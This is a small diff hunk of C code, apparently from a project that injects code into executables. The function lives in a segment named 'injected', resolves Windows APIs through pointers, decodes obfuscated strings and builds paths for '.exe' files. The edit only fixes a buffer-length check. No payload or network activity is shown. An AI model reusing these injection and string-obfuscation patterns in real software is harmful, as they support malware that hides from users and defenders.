@@ -50,7 +50,7 @@ __declspec(code_seg("injected")) VOID inj_code_c() {
     CHAR sDirName[MAX_PATH];
     CHAR sFindPath[MAX_PATH];
     res = pGetCurrentDirectoryA(sizeof(sDirName), sDirName);
-    if (res == 0 || res >= sizeof(sDirName)) {
+    if (res == 0 || res >= sizeof(sDirName) - DEOBF(exeExt).length - 1) {
         pMessageBoxA(NULL, DEOBF(errGetDir), NULL, MB_OK | MB_ICONERROR);
         return;
     }
